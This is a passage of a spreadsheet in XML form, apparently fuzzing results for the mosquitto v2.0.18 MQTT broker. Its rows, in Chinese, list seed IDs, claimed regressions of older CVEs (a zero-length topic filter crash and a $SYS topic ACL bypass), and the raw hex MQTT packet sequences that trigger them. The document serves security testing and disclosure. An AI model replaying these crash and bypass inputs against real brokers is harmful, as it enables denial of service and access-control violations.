          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B295" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C295" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(22B)\u000a4.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95" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0040 ===\u000a大小: 1721B (报告+请求数据)\u000a请求数据: 22B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(22B原始二进制) ---\u000aMsg[1]: (不完整,22B) raw=81a21310af00000174000b73656e736f722f74656d70\u000a(尾部22B): 81a21310af00000174000b73656e736f722f74656d70</f>
        <v/>
      </c>
      <c r="F2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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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9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6">
      <c r="A296" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B296" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C296" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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96" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0042 ===\u000a大小: 701B (报告+请求数据)\u000a请求数据: 178B\u000a\u000a---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MQTT请求序列(178B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3893 Topics=[''(零长度!QoS=3)] | raw_header=82520f3500002b766572792f64656570\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=False payload_len=55B | raw_header=3056001d245359532f62726f6b65722f\u000aMsg[3]: PUBACK  | raw_header=4300\u000aMsg[4]: (不完整,4B) raw=1aed2000\u000a(尾部4B): 1aed2000</f>
        <v/>
      </c>
      <c r="F2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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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9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7">
      <c r="A297" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B297" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C297" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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97" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c0 ===\u000a大小: 2158B (报告+请求数据)\u000a请求数据: 235B\u000a\u000a---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MQTT请求序列(235B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2402 Topics=[''(零长度!QoS=3)] | raw_header=8234096200002b766572792f64656570\u000aMsg[2]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=1 retain=True payload_len=132B | raw_header=3bb101002b766572792f646565702f74\u000aMsg[3]: PUBREL  | raw_header=62</f>
        <v/>
      </c>
      <c r="F2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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J29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9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98">
      <c r="A298" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B298" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C298" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(156B)\u000a4.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298" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c2 ===\u000a大小: 1315B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MQTT请求序列(156B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=34 Topics=[''(零长度!QoS=3)] | raw_header=82190022000013245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=95B | raw_header=397e001d245359532f62726f6b65722f\u000aMsg[3]: PUBREC  | raw_header=54</f>
        <v/>
      </c>
      <c r="F2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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J29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29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299">
      <c r="A299" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:0140</t>
        </is>
      </c>
      <c r="B299" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C299" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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将种子文件(id:000008,sev:4,cat:0140)中的REQUEST DATA提取出来(263B)\u000a4.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299" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0140 ===\u000a大小: 1176B (报告+请求数据)\u000a请求数据: 263B\u000a\u000a---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MQTT请求序列(263B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a20100\u000aMsg[2]: SUBSCRIBE PacketID=20820 Topics=[] | raw_header=854d51545404c6003c00184141414141\u000aMsg[3]: SUBSCRIBE PacketID=17 Topics=[''(零长度!QoS=0), 'aflnet_c/'(QoS=2)] | raw_header=8216001100003c000961666c6e65745f\u000aMsg[4]: SUBSCRIBE PacketID=18 Topics=['home/+dstatus'(QoS=3)] | raw_header=82120012000d686f6d652f2b64737461\u000aMsg[5]: UNSUBSCRIBE  | raw_header=a218001300146465766963652f2b2f74\u000aMsg[6]: (不完整,111B) raw=337f00a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5414141414141\u000a(尾部111B): 337f00a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a541414141414141414141414141414141</f>
        <v/>
      </c>
      <c r="F2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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J29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29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0">
      <c r="A300" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:0141</t>
        </is>
      </c>
      <c r="B300" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C300" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(454B)\u000a4.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300" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0141 ===\u000a大小: 1507B (报告+请求数据)\u000a请求数据: 454B\u000a\u000a---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MQTT请求序列(454B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=14s Will=YES [持久会话] | raw_header=101500044d51545404e4000e00002c01\u000aMsg[2]: SUBSCRIBE PacketID=34315 Topics=[''(零长度!QoS=0)] | raw_header=8d75860b00000006556172652f67332f\u000aMsg[3]: PUBREL PacketID=11520 | raw_header=6f6e2d0013245359532f62726f6b6572\u000aMsg[4]: PUBREL PacketID=12591 | raw_header=656c312f6c6576656c322f6c6576656c\u000aMsg[5]: (不完整,90B) raw=7bc50db8abc772d096dacfb115f0d32b4ab930d5a5cfb115f0d32b4a4ace4a4a4a004a4a4a4a4a4a\u000a(尾部90B): 7bc50db8abc772d096dacfb115f0d32b4ab930d5a5cfb115f0d32b4a4ace4a4a4a004a4a4a4a4a4a4a4a4a4a4a4a4a4a4a4a</f>
        <v/>
      </c>
      <c r="F3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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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0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1">
      <c r="A301" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:0142</t>
        </is>
      </c>
      <c r="B301" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C301" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(74B)\u000a4.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301" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0142 ===\u000a大小: 1132B (报告+请求数据)\u000a请求数据: 74B\u000a\u000a---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MQTT请求序列(74B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=76 Topics=[''(零长度!QoS=0), 'test/topic'(QoS=0)] | raw_header=8212004c000000000a746573742f746f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload='\x00M¦Åwÿ' | raw_header=3a25001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,15B) raw=75e6741475e674143575ff3575ffff\u000a(尾部15B): 75e6741475e674143575ff3575ffff</f>
        <v/>
      </c>
      <c r="F3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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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0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2">
      <c r="A302" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:0143</t>
        </is>
      </c>
      <c r="B302" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C302" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(182B)\u000a4.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302" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0143 ===\u000a大小: 1053B (报告+请求数据)\u000a请求数据: 182B\u000a\u000a---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MQTT请求序列(182B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=370 Topics=[''(零长度!QoS=2)] | raw_header=82460172000012686f6d652f2b2f7465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=85B | raw_header=306a0013245359532f62726f6b65722f\u000aMsg[3]: (不完整,2B) raw=89e2\u000a(尾部2B): 89e2</f>
        <v/>
      </c>
      <c r="F3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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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0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3">
      <c r="A303" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:01c0</t>
        </is>
      </c>
      <c r="B303" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C303" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(1428B)\u000a4.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303" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:01c0 ===\u000a大小: 2158B (报告+请求数据)\u000a请求数据: 1428B\u000a\u000a---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MQTT请求序列(1428B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a25000044d51545404c6003c00184141\u000aMsg[2]: SUBSCRIBE PacketID=1553 Topics=['sensor¯~emp/_oom1'(QoS=3)] | raw_header=82160611001173656e736f72af7e656d\u000aMsg[3]: PUBACK PacketID=24948 | raw_header=4074617475f9f9f9f9f9f9f9f9f9f9f9\u000aMsg[4]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[5]: PUBACK PacketID=16705 | raw_header=414141414141414141414166757a7a5f\u000aMsg[6]: PUBREL  | raw_header=6300\u000aMsg[7]: PUBREL  | raw_header=6700\u000aMsg[8]: TYPE0  | raw_header=094b757a7a5f75736572000966757a7a\u000aMsg[9]: TYPE0  | raw_header=000966757a7a5f70617373\u000aMsg[10]: SUBSCRIBE PacketID=9 Topics=[''(零长度!QoS=2)] | raw_header=82050009000002\u000aMsg[11]: PUBLISH Topic='a/b/c/d/e\x1ef/g/h/i/j' QoS=0 retain=True payload_len=96B | raw_header=31750013612f622f632f642f651e662f\u000aMsg[12]: PUBCOMP PacketID=31327 | raw_header=757a7a5f75736572000966757a7a5f70\u000aMsg[13]: (不完整,728B) raw=f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9\u000a(尾部728B): f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9f9</f>
        <v/>
      </c>
      <c r="F3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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J30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0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4">
      <c r="A304" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:01c1</t>
        </is>
      </c>
      <c r="B304" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C304" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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将种子文件(id:000008,sev:4,cat:01c1)中的REQUEST DATA提取出来(290B)\u000a4.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304" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:01c1 ===\u000a大小: 1530B (报告+请求数据)\u000a请求数据: 290B\u000a\u000a---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MQTT请求序列(290B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=14s Will=YES [持久会话] | raw_header=101500044d51545404e4000e00002c01\u000aMsg[2]: AUTH  | raw_header=ff00\u000aMsg[3]: SUBSCRIBE PacketID=2560 Topics=[''(零长度!QoS=3)] | raw_header=82420a0000000b73656e736f722f7465\u000aMsg[4]: PUBLISH Topic='home/+/temperature' QoS=0 retain=True payload_len=167B | raw_header=39bb010012686f6d652f2b2f74656d70\u000aMsg[5]: (不完整,7B) raw=827365723d6675\u000a(尾部7B): 827365723d6675</f>
        <v/>
      </c>
      <c r="F3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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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0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5">
      <c r="A305" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:01c2</t>
        </is>
      </c>
      <c r="B305" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C305" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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305" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:01c2 ===\u000a大小: 1366B (报告+请求数据)\u000a请求数据: 120B\u000a\u000a---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PUBACK  | raw_header=4400\u000aMsg[2]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=11044d515454\u000aMsg[3]: TYPE0  | raw_header=0000\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: TYPE0  | raw_header=000a67656e5f76355f737562\u000aMsg[6]: SUBSCRIBE PacketID=5775 Topics=[''(零长度!QoS=1), '#'(QoS=1), 'test/topic'(QoS=2)] | raw_header=8216168f00000100012301000a746573\u000aMsg[7]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload='\x17Î¼smp\x000' | raw_header=351d0013245359532f62726f6b65722f\u000aMsg[8]: CONNECT  | raw_header=1700\u000aMsg[9]: (不完整,39B) raw=1173656e736f722f726f6f6d312f74656d7032322e35c0003211000c636d642f6c696768742f6f\u000a(尾部39B): 1173656e736f722f726f6f6d312f74656d7032322e35c0003211000c636d642f6c696768742f6f</f>
        <v/>
      </c>
      <c r="F3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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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0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6">
      <c r="A306" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:01c3</t>
        </is>
      </c>
      <c r="B306" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C306" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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将种子文件(id:000008,sev:4,cat:01c3)中的REQUEST DATA提取出来(160B)\u000a4.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306" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:01c3 ===\u000a大小: 1218B (报告+请求数据)\u000a请求数据: 160B\u000a\u000a---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MQTT请求序列(160B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=39 Topics=[''(零长度!QoS=2)] | raw_header=821800270000122473686172652f6772\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=True payload_len=109B | raw_header=3382010013245359532f62726f6b6572\u000aMsg[3]: PUBCOMP  | raw_header=7f</f>
        <v/>
      </c>
      <c r="F3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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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0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7">
      <c r="A307" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B307" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C307" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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07" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0244 ===\u000a大小: 2093B (报告+请求数据)\u000a请求数据: 230B\u000a\u000a---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MQTT请求序列(230B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3802 Topics=[''(零长度!QoS=1)] | raw_header=82340eda0000152473686172652f6772\u000aMsg[2]: PUBLISH Topic='a/b/c/d/e' QoS=1 retain=False payload_len=161B | raw_header=32ac010009612f622f632f642f650edb\u000aMsg[3]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F3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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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0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08">
      <c r="A308" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:0246</t>
        </is>
      </c>
      <c r="B308" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C308" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(159B)\u000a4.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308" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0246 ===\u000a大小: 860B (报告+请求数据)\u000a请求数据: 159B\u000a\u000a---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MQTT请求序列(159B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=20 Topics=[''(零长度!QoS=3)] | raw_header=82220014000013245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=54B | raw_header=3455001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,36B) raw=2f2f46154d2f2f2f2f2f4f2f2f2f2f2f2f2f2f2f2f2f2f431b4e2f2f2f2f2d562f2f2f13\u000a(尾部36B): 2f2f46154d2f2f2f2f2f4f2f2f2f2f2f2f2f2f2f2f2f2f431b4e2f2f2f2f2d562f2f2f13</f>
        <v/>
      </c>
      <c r="F3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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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0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09">
      <c r="A309" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B309" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C309" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(138B)\u000a4.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09" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c4 ===\u000a大小: 2188B (报告+请求数据)\u000a请求数据: 138B\u000a\u000a---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MQTT请求序列(138B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3957 Topics=[''(零长度!QoS=3)] | raw_header=822c0f7500000b73656e736f722f7465\u000aMsg[2]: PUBLISH Topic='a/b/c/d/e' QoS=2 retain=True payload_len=73B | raw_header=35540009612f622f632f642f650f7646\u000aMsg[3]: (不完整,6B) raw=612f69631d6c\u000a(尾部6B): 612f69631d6c</f>
        <v/>
      </c>
      <c r="F3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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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0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10">
      <c r="A310" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B310" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C310" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(187B)\u000a4.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310" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c6 ===\u000a大小: 1429B (报告+请求数据)\u000a请求数据: 187B\u000a\u000a---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MQTT请求序列(187B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='MQTT\x04\x02\x00&lt;\x00\x07fu' QoS=1 retain=False payload='zz_' | raw_header=3211000c4d5154540402003c00076675\u000aMsg[2]: SUBSCRIBE PacketID=24 Topics=[''(零长度!QoS=1)] | raw_header=8213001800000d2473686172652f6772\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=78B | raw_header=31630013245359532f62726f6b65722f\u000aMsg[4]: (不完整,46B) raw=6331820b00010006746573742f230030ffff80006573742f6168656c6c6fa20a0002000080657374\u000a(尾部46B): 6331820b00010006746573742f230030ffff80006573742f6168656c6c6fa20a00020000806573742f23c000e000</f>
        <v/>
      </c>
      <c r="F3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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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11">
      <c r="A311" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:0344</t>
        </is>
      </c>
      <c r="B311" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C311" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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将种子文件(id:000008,sev:4,cat:0344)中的REQUEST DATA提取出来(122B)\u000a4.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311" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0344 ===\u000a大小: 1198B (报告+请求数据)\u000a请求数据: 122B\u000a\u000a---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PacketID=3473 Topics=[''(零长度!QoS=3)] | raw_header=82190d91000013245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='test/topic' QoS=2 retain=False payload_len=80B | raw_header=345c000a746573742f746f7069630d92\u000aMsg[3]: PUBREC  | raw_header=5c</f>
        <v/>
      </c>
      <c r="F3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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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12">
      <c r="A312" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:0346</t>
        </is>
      </c>
      <c r="B312" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C312" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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将种子文件(id:000008,sev:4,cat:0346)中的REQUEST DATA提取出来(95B)\u000a4.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0x0346\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E312" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0346 ===\u000a大小: 1316B (报告+请求数据)\u000a请求数据: 95B\u000a\u000a---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MQTT请求序列(95B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=a20500044d5154\u000aMsg[2]: PUBREC PacketID=512 | raw_header=540402003c29\u000aMsg[3]: SUBSCRIBE PacketID=4 Topics=[''(零长度!QoS=2)] | raw_header=82050004000002\u000aMsg[4]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=41B | raw_header=343e0013245359532f62726f6b65722f\u000aMsg[5]: (不完整,11B) raw=0984666c6e65745f633015\u000a(尾部11B): 0984666c6e65745f633015</f>
        <v/>
      </c>
      <c r="F3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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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13">
      <c r="A313" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:03c4</t>
        </is>
      </c>
      <c r="B313" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C313" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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将种子文件(id:000008,sev:4,cat:03c4)中的REQUEST DATA提取出来(162B)\u000a4.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313" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:03c4 ===\u000a大小: 1425B (报告+请求数据)\u000a请求数据: 162B\u000a\u000a---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MQTT请求序列(162B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=5 Topics=[''(零长度!QoS=0)] | raw_header=822600050000142473686172652f6772\u000aMsg[2]: PUBLISH Topic='test/topic' QoS=2 retain=True payload_len=87B | raw_header=3563000a746573742f746f7069630006\u000aMsg[3]: (不完整,21B) raw=101500044d63fffff13bf10961666c6e65745f6330\u000a(尾部21B): 101500044d63fffff13bf10961666c6e65745f6330</f>
        <v/>
      </c>
      <c r="F3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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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1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14">
      <c r="A314" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:4,cat:03c5</t>
        </is>
      </c>
      <c r="B314" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
